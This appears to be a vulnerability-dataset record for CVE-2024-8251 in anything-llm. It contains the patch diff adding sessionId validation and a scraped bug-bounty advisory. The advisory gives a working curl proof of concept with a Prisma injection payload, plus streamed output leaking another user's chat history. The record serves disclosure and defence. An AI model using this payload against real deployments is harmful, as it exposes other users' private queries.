{
    "CVE-2024-8251": {
        "published_date": "2025-03-20T10:08:48.644Z",
        "patch_commits": [
            {
                "url": "https://github.com/mintplex-labs/anything-llm/commit/334fd9cdd02ad4aa6a3c9bdfc95e7764651c13f4",
                "content": "pre-validate sessionID type for embed chats\n\nFilename: server/models/embedChats.js:\n```\n@@ -15,7 +15,7 @@\nconst EmbedChats = {\n           embed_id: Number(embedId),\n           response: JSON.stringify(response),\n           connection_information: JSON.stringify(connection_information),\n-          session_id: sessionId,\n+          session_id: String(sessionId),\n         },\n       });\n       return { chat, message: null };\n\n@@ -36,8 +36,8 @@\nconst EmbedChats = {\n     try {\n       const chats = await prisma.embed_chats.findMany({\n         where: {\n-          embed_id: embedId,\n-          session_id: sessionId,\n+          embed_id: Number(embedId),\n+          session_id: String(sessionId),\n           include: true,\n         },\n         ...(limit !== null ? { take: limit } : {}),\n\n@@ -56,8 +56,8 @@\nconst EmbedChats = {\n     try {\n       await prisma.embed_chats.updateMany({\n         where: {\n-          embed_id: embedId,\n-          session_id: sessionId,\n+          embed_id: Number(embedId),\n+          session_id: String(sessionId),\n         },\n         data: {\n           include: false,\n```\n\nFilename: server/utils/middleware/embedMiddleware.js:\n```\n@@ -1,4 +1,4 @@\n-const { v4: uuidv4 } = require(\"uuid\");\n+const { v4: uuidv4, validate } = require(\"uuid\");\n const { VALID_CHAT_MODE } = require(\"../chats/stream\");\n const { EmbedChats } = require(\"../../models/embedChats\");\n const { EmbedConfig } = require(\"../../models/embedConfig\");\n\n@@ -78,6 +78,17 @@\nasync function canRespond(request, response, next) {\n     }\n \n     const { sessionId, message } = reqBody(request);\n+    if (typeof sessionId !== \"string\" || !validate(String(sessionId))) {\n+      response.status(404).json({\n+        id: uuidv4(),\n+        type: \"abort\",\n+        textResponse: null,\n+        sources: [],\n+        close: true,\n+        error: \"Invalid session ID.\",\n+      });\n+      return;\n+    }\n \n     if (!message?.length || !VALID_CHAT_MODE.includes(embed.chat_mode)) {\n       response.status(400).json({\n```"
            }
        ],
        "sw_version": "v1.2.1",
        "sw_version_wget": "https://github.com/mintplex-labs/anything-llm/archive/refs/tags/v1.2.1.zip",
        "description": "A vulnerability in mintplex-labs/anything-llm prior to version 1.2.2 allows for Prisma injection. The issue exists in the API endpoint \"/embed/:embedId/stream-chat\" where user-provided JSON is directly taken to the Prisma library's where clause. An attacker can exploit this by providing a specially crafted JSON object, such as {\"sessionId\":{\"not\":\"a\"}}, causing Prisma to return all data from the table. This can lead to unauthorized access to all user queries in embedded chat mode.",
        "sec_adv": [
            {
                "url": "https://huntr.com/bounties/7c263ef1-7d50-475a-9425-b15df4e0403c",
                "content": "Bounties\nPartners\nCommunity\nInfo\nSUBMIT REPORT\nDirectly take user json to prisma library where clause, aka prisma injection in mintplex-labs/anything-llm\nValid\nReported on Aug 4th 2024\nDescription\nAnythingLLm Directly take user json to prisma library where clause, aka prisma injection. If user provide something like {\"sessionId\":{\"not\":\"a\"}}, it will cause prisma(sql) to return all the data from that table.\nProof of Concept\nThe vulnerability lays in the API \"/embed/:embedId/stream-chat\" . To set up, first create a new workspace to chat normally. Then create a Embeddable Chat via web page , tools -> chat embeded. Note that you should set the embedded chat to chat mode, not query mode.\nThen attacker can query the api with something like :\ncurl -X POST http://localhost:3001/api/embed/6737250d-13b2-4fb9-9836-fae509112785/stream-chat -H \"Content-Type: text/plain;charset=UTF-8\" -d '{\"message\":\"what have i say previously?\",\"sessionId\":{\"not\":\"a\"},\"prompt\":null,\"model\":null,\"temperature\":null}'\nnote that : the prompt is \"what have i say previously?\", the sessionid is {\"not\":\"a\"}, which is nearly everything. The server will response to me like\ndata: {\"uuid\":\"9ce56d4f-962a-43b5-bef2-ff289aee8ad5\",\"sources\":[],\"type\":\"textResponseChunk\",\"textResponse\":\"Let\",\"close\":false,\"error\":false}\n\ndata: {\"uuid\":\"9ce56d4f-962a-43b5-bef2-ff289aee8ad5\",\"sources\":[],\"type\":\"textResponseChunk\",\"textResponse\":\" me\",\"close\":false,\"error\":false}\n\ndata: {\"uuid\":\"9ce56d4f-962a-43b5-bef2-ff289aee8ad5\",\"sources\":[],\"type\":\"textResponseChunk\",\"textResponse\":\" check\",\"close\":false,\"error\":false}\n\ndata: {\"uuid\":\"9ce56d4f-962a-43b5-bef2-ff289aee8ad5\",\"sources\":[],\"type\":\"textResponseChunk\",\"textResponse\":\"!\",\"close\":false,\"error\":false}\n\ndata: {\"uuid\":\"9ce56d4f-962a-43b5-bef2-ff289aee8ad5\",\"sources\":[],\"type\":\"textResponseChunk\",\"textResponse\":\" You\",\"close\":false,\"error\":false}\n\ndata: {\"uuid\":\"9ce56d4f-962a-43b5-bef2-ff289aee8ad5\",\"sources\":[],\"type\":\"textResponseChunk\",\"textResponse\":\" previously\",\"close\":false,\"error\":false}\n\ndata: {\"uuid\":\"9ce56d4f-962a-43b5-bef2-ff289aee8ad5\",\"sources\":[],\"type\":\"textResponseChunk\",\"textResponse\":\" mentioned\",\"close\":false,\"error\":false}\n\ndata: {\"uuid\":\"9ce56d4f-962a-43b5-bef2-ff289aee8ad5\",\"sources\":[],\"type\":\"textResponseChunk\",\"textResponse\":\" that\",\"close\":false,\"error\":false}\n\ndata: {\"uuid\":\"9ce56d4f-962a-43b5-bef2-ff289aee8ad5\",\"sources\":[],\"type\":\"textResponseChunk\",\"textResponse\":\":\\n\\n\",\"close\":false,\"error\":false}\n\ndata: {\"uuid\":\"9ce56d4f-962a-43b5-bef2-ff289aee8ad5\",\"sources\":[],\"type\":\"textResponseChunk\",\"textResponse\":\"1\",\"close\":false,\"error\":false}\n\ndata: {\"uuid\":\"9ce56d4f-962a-43b5-bef2-ff289aee8ad5\",\"sources\":[],\"type\":\"textResponseChunk\",\"textResponse\":\".\",\"close\":false,\"error\":false}\n\ndata: {\"uuid\":\"9ce56d4f-962a-43b5-bef2-ff289aee8ad5\",\"sources\":[],\"type\":\"textResponseChunk\",\"textResponse\":\" Your\",\"close\":false,\"error\":false}\n\ndata: {\"uuid\":\"9ce56d4f-962a-43b5-bef2-ff289aee8ad5\",\"sources\":[],\"type\":\"textResponseChunk\",\"textResponse\":\" username\",\"close\":false,\"error\":false}\n\ndata: {\"uuid\":\"9ce56d4f-962a-43b5-bef2-ff289aee8ad5\",\"sources\":[],\"type\":\"textResponseChunk\",\"textResponse\":\" is\",\"close\":false,\"error\":false}\n\ndata: {\"uuid\":\"9ce56d4f-962a-43b5-bef2-ff289aee8ad5\",\"sources\":[],\"type\":\"textResponseChunk\",\"textResponse\":\" \\\"\",\"close\":false,\"error\":false}\n\ndata: {\"uuid\":\"9ce56d4f-962a-43b5-bef2-ff289aee8ad5\",\"sources\":[],\"type\":\"textResponseChunk\",\"textResponse\":\"o\",\"close\":false,\"error\":false}\n\ndata: {\"uuid\":\"9ce56d4f-962a-43b5-bef2-ff289aee8ad5\",\"sources\":[],\"type\":\"textResponseChunk\",\"textResponse\":\"ic\",\"close\":false,\"error\":false}\n\ndata: {\"uuid\":\"9ce56d4f-962a-43b5-bef2-ff289aee8ad5\",\"sources\":[],\"type\":\"textResponseChunk\",\"textResponse\":\"u\",\"close\":false,\"error\":false}\n\ndata: {\"uuid\":\"9ce56d4f-962a-43b5-bef2-ff289aee8ad5\",\"sources\":[],\"type\":\"textResponseChunk\",\"textResponse\":\"\\\"\\n\",\"close\":false,\"error\":false}\n\ndata: {\"uuid\":\"9ce56d4f-962a-43b5-bef2-ff289aee8ad5\",\"sources\":[],\"type\":\"textResponseChunk\",\"textResponse\":\"2\",\"close\":false,\"error\":false}\n\ndata: {\"uuid\":\"9ce56d4f-962a-43b5-bef2-ff289aee8ad5\",\"sources\":[],\"type\":\"textResponseChunk\",\"textResponse\":\".\",\"close\":false,\"error\":false}\n\ndata: {\"uuid\":\"9ce56d4f-962a-43b5-bef2-ff289aee8ad5\",\"sources\":[],\"type\":\"textResponseChunk\",\"textResponse\":\" Your\",\"close\":false,\"error\":false}\n\ndata: {\"uuid\":\"9ce56d4f-962a-43b5-bef2-ff289aee8ad5\",\"sources\":[],\"type\":\"textResponseChunk\",\"textResponse\":\" name\",\"close\":false,\"error\":false}\n\ndata: {\"uuid\":\"9ce56d4f-962a-43b5-bef2-ff289aee8ad5\",\"sources\":[],\"type\":\"textResponseChunk\",\"textResponse\":\" is\",\"close\":false,\"error\":false}\n\ndata: {\"uuid\":\"9ce56d4f-962a-43b5-bef2-ff289aee8ad5\",\"sources\":[],\"type\":\"textResponseChunk\",\"textResponse\":\" not\",\"close\":false,\"error\":false}\n\ndata: {\"uuid\":\"9ce56d4f-962a-43b5-bef2-ff289aee8ad5\",\"sources\":[],\"type\":\"textResponseChunk\",\"textResponse\":\" \\\"\",\"close\":false,\"error\":false}\n\ndata: {\"uuid\":\"9ce56d4f-962a-43b5-bef2-ff289aee8ad5\",\"sources\":[],\"type\":\"textResponseChunk\",\"textResponse\":\"o\",\"close\":false,\"error\":false}\n\ndata: {\"uuid\":\"9ce56d4f-962a-43b5-bef2-ff289aee8ad5\",\"sources\":[],\"type\":\"textResponseChunk\",\"textResponse\":\"ic\",\"close\":false,\"error\":false}\n\ndata: {\"uuid\":\"9ce56d4f-962a-43b5-bef2-ff289aee8ad5\",\"sources\":[],\"type\":\"textResponseChunk\",\"textResponse\":\"u\",\"close\":false,\"error\":false}\n\ndata: {\"uuid\":\"9ce56d4f-962a-43b5-bef2-ff289aee8ad5\",\"sources\":[],\"type\":\"textResponseChunk\",\"textResponse\":\"\\\",\",\"close\":false,\"error\":false}\n\ndata: {\"uuid\":\"9ce56d4f-962a-43b5-bef2-ff289aee8ad5\",\"sources\":[],\"type\":\"textResponseChunk\",\"textResponse\":\" but\",\"close\":false,\"error\":false}\n\ndata: {\"uuid\":\"9ce56d4f-962a-43b5-bef2-ff289aee8ad5\",\"sources\":[],\"type\":\"textResponseChunk\",\"textResponse\":\" rather\",\"close\":false,\"error\":false}\n\ndata: {\"uuid\":\"9ce56d4f-962a-43b5-bef2-ff289aee8ad5\",\"sources\":[],\"type\":\"textResponseChunk\",\"textResponse\":\" \\\"\",\"close\":false,\"error\":false}\n\ndata: {\"uuid\":\"9ce56d4f-962a-43b5-bef2-ff289aee8ad5\",\"sources\":[],\"type\":\"textResponseChunk\",\"textResponse\":\"oooo\",\"close\":false,\"error\":false}\n\ndata: {\"uuid\":\"9ce56d4f-962a-43b5-bef2-ff289aee8ad5\",\"sources\":[],\"type\":\"textResponseChunk\",\"textResponse\":\"\\\"\\n\\n\",\"close\":false,\"error\":false}\n\ndata: {\"uuid\":\"9ce56d4f-962a-43b5-bef2-ff289aee8ad5\",\"sources\":[],\"type\":\"textResponseChunk\",\"textResponse\":\"Is\",\"close\":false,\"error\":false}\n\ndata: {\"uuid\":\"9ce56d4f-962a-43b5-bef2-ff289aee8ad5\",\"sources\":[],\"type\":\"textResponseChunk\",\"textResponse\":\" there\",\"close\":false,\"error\":false}\n\ndata: {\"uuid\":\"9ce56d4f-962a-43b5-bef2-ff289aee8ad5\",\"sources\":[],\"type\":\"textResponseChunk\",\"textResponse\":\" anything\",\"close\":false,\"error\":false}\n\ndata: {\"uuid\":\"9ce56d4f-962a-43b5-bef2-ff289aee8ad5\",\"sources\":[],\"type\":\"textResponseChunk\",\"textResponse\":\" else\",\"close\":false,\"error\":false}\n\ndata: {\"uuid\":\"9ce56d4f-962a-43b5-bef2-ff289aee8ad5\",\"sources\":[],\"type\":\"textResponseChunk\",\"textResponse\":\" I\",\"close\":false,\"error\":false}\n\ndata: {\"uuid\":\"9ce56d4f-962a-43b5-bef2-ff289aee8ad5\",\"sources\":[],\"type\":\"textResponseChunk\",\"textResponse\":\" should\",\"close\":false,\"error\":false}\n\ndata: {\"uuid\":\"9ce56d4f-962a-43b5-bef2-ff289aee8ad5\",\"sources\":[],\"type\":\"textResponseChunk\",\"textResponse\":\" know\",\"close\":false,\"error\":false}\n\ndata: {\"uuid\":\"9ce56d4f-962a-43b5-bef2-ff289aee8ad5\",\"sources\":[],\"type\":\"textResponseChunk\",\"textResponse\":\" or\",\"close\":false,\"error\":false}\n\ndata: {\"uuid\":\"9ce56d4f-962a-43b5-bef2-ff289aee8ad5\",\"sources\":[],\"type\":\"textResponseChunk\",\"textResponse\":\" remember\",\"close\":false,\"error\":false}\n\ndata: {\"uuid\":\"9ce56d4f-962a-43b5-bef2-ff289aee8ad5\",\"sources\":[],\"type\":\"textResponseChunk\",\"textResponse\":\" from\",\"close\":false,\"error\":false}\n\ndata: {\"uuid\":\"9ce56d4f-962a-43b5-bef2-ff289aee8ad5\",\"sources\":[],\"type\":\"textResponseChunk\",\"textResponse\":\" our\",\"close\":false,\"error\":false}\n\ndata: {\"uuid\":\"9ce56d4f-962a-43b5-bef2-ff289aee8ad5\",\"sources\":[],\"type\":\"textResponseChunk\",\"textResponse\":\" conversation\",\"close\":false,\"error\":false}\n\ndata: {\"uuid\":\"9ce56d4f-962a-43b5-bef2-ff289aee8ad5\",\"sources\":[],\"type\":\"textResponseChunk\",\"textResponse\":\" so\",\"close\":false,\"error\":false}\n\ndata: {\"uuid\":\"9ce56d4f-962a-43b5-bef2-ff289aee8ad5\",\"sources\":[],\"type\":\"textResponseChunk\",\"textResponse\":\" far\",\"close\":false,\"error\":false}\n\ndata: {\"uuid\":\"9ce56d4f-962a-43b5-bef2-ff289aee8ad5\",\"sources\":[],\"type\":\"textResponseChunk\",\"textResponse\":\"?\",\"close\":false,\"error\":false}\n\ndata: {\"uuid\":\"9ce56d4f-962a-43b5-bef2-ff289aee8ad5\",\"sources\":[],\"type\":\"textResponseChunk\",\"textResponse\":\"\",\"close\":false,\"error\":false}\n\ndata: {\"uuid\":\"9ce56d4f-962a-43b5-bef2-ff289aee8ad5\",\"sources\":[],\"type\":\"textResponseChunk\",\"textResponse\":\"\",\"close\":true,\"error\":false}\nWhich is all what other user asks.\nImpact\nThis will lead to attacker knows all what other user asked, in embedded chat mode.\nOccurrences\nembed.js L11-L65\nThe occurance show the call stack from user input value to the prisma callsite. The check of user input can be added anywhere on the callstack.\nembed.js L192-L203\nThe occurance show the call stack from user input value to the prisma callsite. The check of user input can be added anywhere on the callstack.\nembedChats.js L29-L42\nThe occurance show the call stack from user input value to the prisma callsite. The check of user input can be added anywhere on the callstack.\nindex.js L25-L44\nThe occurance show the call stack from user input value to the prisma callsite. The check of user input can be added anywhere on the callstack.\nWe are processing your report and will contact themintplex-labs/anything-llm team within 24 hours.9 months ago\nA GitHub Issue asking the maintainers to create a SECURITY.md exists9 months ago\nWe have contacted a member of themintplex-labs/anything-llm team and are waiting to hear back9 months ago\nWe have sent a follow up to the mintplex-labs/anything-llm team. We will try again in 4 days.9 months ago\nWe have sent a second follow up to the mintplex-labs/anything-llm team. We will try again in 7 days.9 months ago\nWe have sent a third follow up to the mintplex-labs/anything-llm team. We will try again in 14 days.9 months ago\nTimothy Carambat validated this vulnerability9 months ago\noicu0619has been awarded the disclosure bounty\nThe fix bounty is now up for grabs\nThe researcher's credibility has increased: +7\nCVE-2024-8251assigned to this report.9 months ago\nTimothy Carambatmarked this as fixedin 1.2.2with commit334fd99 months ago\nTimothy Carambathas been awarded the fix bounty\nindex.js#L25-L44 has been validated\nembed.js#L11-L65 has been validated\nembed.js#L192-L203 has been validated\nembedChats.js#L29-L42 has been validated\nWe have notified the mintplex-labs/anything-llm maintainers about this report in their weekly follow-up7 months ago\nWe have sent a warning to the mintplex-labs/anything-llm team to inform them that this report will be published in 48 hours7 months ago\nThis vulnerability has now been published6 months ago\nCVE-2024-8251has now been published2 months ago\nSign in to join this conversation\nCVE\nCVE-2024-8251\n(Published)\nVulnerability Type\nCWE-20: Improper Input Validation\nSeverity\nMedium (5.3)\nAttack vector\nNetwork\nAttack complexity\nLow\nPrivileges required\nNone\nUser interaction\nNone\nScope\nUnchanged\nConfidentiality\nLow\nIntegrity\nNone\nAvailability\nNone\nOpen in visual CVSS calculator\nRegistry\nNpm\nAffected Version\ngit cc594d4\nVisibility\nPublic\nStatus\nFixed\nDisclosure Bounty\n$120\nFix Bounty\n$18.75\nFound by\nFixed by\nSupported by Protect AI and leading the way to MLSecOps and greater AI security.\nÂ© 2024\nPrivacy Policy\nTerms of Service\nCode of Conduct\nCookie Preferences\nContact Us",
                "effective": true,
                "effective_reason": "The security advisory provides a detailed proof of concept, including clear steps to reproduce the vulnerability."
            }
        ],
        "cwe": [
            {
                "id": "CWE-20",
                "value": "CWE-20 Improper Input Validation"
            }
        ]
    }
}